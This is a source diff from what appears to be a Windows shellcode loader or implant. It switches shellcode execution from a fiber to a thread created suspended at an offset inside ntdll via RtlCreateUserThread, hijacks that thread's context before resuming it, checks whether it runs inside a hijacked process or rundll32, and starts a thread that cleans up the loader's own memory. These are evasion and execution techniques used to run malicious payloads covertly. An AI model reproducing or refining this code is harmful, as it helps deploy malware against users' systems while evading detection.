@@ -517,7 +517,7 @@ void main(LPVOID dllOffloadEntry = NULL)
 	while (TRUE) {};
 #endif
 #ifdef RELEASE_DLL
-	/*RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
+	RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlCreateUserThread");
 	HANDLE threadHandle;
 	RtlCreateUserThread(GetCurrentProcess(), NULL, true, 0, 0, 0, (LPTHREAD_START_ROUTINE)((LPBYTE)RtlCreateUserThread+0x21), NULL, &threadHandle, NULL);
 	hookID = GetThreadId(threadHandle);
@@ -531,19 +531,12 @@ void main(LPVOID dllOffloadEntry = NULL)
 	SleepEx(1500, FALSE);
 	Initialize3Context(FALSE);
 	ResumeThread(threadHandle);
-	*/
 
-	hookID = GetCurrentThreadId();
+	/*hookID = GetCurrentThreadId();
 	Initialize3Context(FALSE);
 	PVOID mainFiber = ConvertThreadToFiber(NULL);
 	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)sh, NULL);
-	SwitchToFiber(shellcodeFiber);
-	
-	if (fileName.find(procNameHijack) != std::string::npos) {
-		Initialize2Context(FALSE);
-	} else if (fileName.find("rundll32") != std::string::npos) {
-		//while (TRUE);
-	}
+	SwitchToFiber(shellcodeFiber);*/
 
 	if (dllOffloadEntry != NULL) {
 		MEMORY_BASIC_INFORMATION cleanOffloader = { 0 };
@@ -551,6 +544,12 @@ void main(LPVOID dllOffloadEntry = NULL)
 		//_VirtualQuery(GetCurrentProcess(), (PVOID)dllOffloadEntry, MemoryBasicInformation, &cleanOffloader, sizeof(cleanOffloader), w);
 		VirtualQuery(dllOffloadEntry, &cleanOffloader, sizeof(cleanOffloader));
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)doCleanup, (LPVOID)cleanOffloader.AllocationBase, 0, NULL);
+	}
+
+	if (fileName.find(procNameHijack) != std::string::npos) {
+		Initialize2Context(FALSE);
+	} else if (fileName.find("rundll32") != std::string::npos) {
+		//while (TRUE);
 	}
 #endif
 }
